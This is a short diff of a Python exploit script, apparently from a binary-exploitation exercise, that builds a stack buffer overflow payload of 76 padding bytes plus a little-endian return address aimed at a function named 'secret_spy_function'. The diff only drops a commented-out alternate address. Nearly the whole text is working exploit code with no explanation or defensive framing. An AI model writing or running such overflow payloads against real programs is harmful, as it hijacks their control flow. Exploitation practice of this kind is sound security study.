@@ -4,5 +4,5 @@ import struct
 payload = 'A' * 76
 # Address of secret_spy_function (Little-endian format)
 payload += struct.pack('<I', 0x565561f4)
-#0x565561bd
+
 print(payload)
